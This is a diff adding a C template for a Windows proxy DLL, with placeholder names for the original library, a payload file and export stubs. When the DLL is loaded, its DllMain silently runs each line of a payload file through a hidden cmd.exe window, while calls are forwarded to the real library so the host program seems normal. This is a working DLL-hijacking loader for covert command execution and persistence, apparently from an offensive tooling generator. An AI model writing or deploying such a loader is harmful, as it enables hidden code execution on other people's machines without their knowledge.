@@ -1,0 +1,118 @@
+#define WIN32_LEAN_AND_MEAN
+#define _CRT_SECURE_NO_WARNINGS
+#include <windows.h>
+#ifdef __TINYC__
+#include "tcc_compat.h"
+#endif
+#include <stdint.h>
+#include <stdio.h>
+#include <wchar.h>
+
+static const wchar_t ORIGINAL_DLL[] = L"__ORIGINAL_DLL__";
+static const wchar_t PAYLOAD_NAME[] = L"__PAYLOAD_NAME__";
+static const wchar_t PAYLOAD_FALLBACK[] = L"__PAYLOAD_FALLBACK__";
+static wchar_t g_dir[MAX_PATH];
+static HMODULE g_orig = NULL;
+
+static FILE *open_payload(void)
+{
+    wchar_t path[MAX_PATH];
+    FILE *f;
+
+    _snwprintf(path, MAX_PATH, L"%s\\%s", g_dir, PAYLOAD_NAME);
+    f = _wfopen(path, L"rb");
+    if (f) {
+        return f;
+    }
+    return _wfopen(PAYLOAD_FALLBACK, L"rb");
+}
+
+static void run_one_line(char *line)
+{
+    wchar_t wcmd[4096];
+    wchar_t cmdline[4200];
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+    size_t n;
+
+    while (*line == ' ' || *line == '\t') {
+        line++;
+    }
+    n = 0;
+    while (line[n]) {
+        n++;
+    }
+    while (n && (line[n - 1] == '\n' || line[n - 1] == '\r' || line[n - 1] == ' ')) {
+        line[--n] = 0;
+    }
+    if (!n) {
+        return;
+    }
+    if (!MultiByteToWideChar(CP_UTF8, 0, line, -1, wcmd, 4096)) {
+        return;
+    }
+    _snwprintf(cmdline, 4200, L"cmd.exe /c %s", wcmd);
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+    if (CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
+                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hThread);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+    }
+}
+
+static void run_payload(void)
+{
+    FILE *f = open_payload();
+    char buf[4096];
+
+    if (!f) {
+        return;
+    }
+    while (fgets(buf, sizeof(buf), f)) {
+        run_one_line(buf);
+    }
+    fclose(f);
+}
+
+static HMODULE original_module(void)
+{
+    if (!g_orig) {
+        wchar_t full[MAX_PATH];
+        _snwprintf(full, MAX_PATH, L"%s\\%s", g_dir, ORIGINAL_DLL);
+        g_orig = LoadLibraryW(full);
+    }
+    return g_orig;
+}
+
+static FARPROC resolve(const char *name)
+{
+    HMODULE h = original_module();
+    return h ? GetProcAddress(h, name) : NULL;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
+{
+    (void)reserved;
+    if (reason == DLL_PROCESS_ATTACH) {
+        wchar_t buf[MAX_PATH];
+        if (GetModuleFileNameW(hinst, buf, MAX_PATH)) {
+            wchar_t *slash = wcsrchr(buf, L'\\');
+            if (slash) {
+                *slash = 0;
+                wcsncpy(g_dir, buf, MAX_PATH);
+                g_dir[MAX_PATH - 1] = 0;
+            }
+        }
+        run_payload();
+    }
+    return TRUE;
+}
+
+typedef uintptr_t (WINAPI *fn10)(
+    uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t,
+    uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
+
+__STUBS__
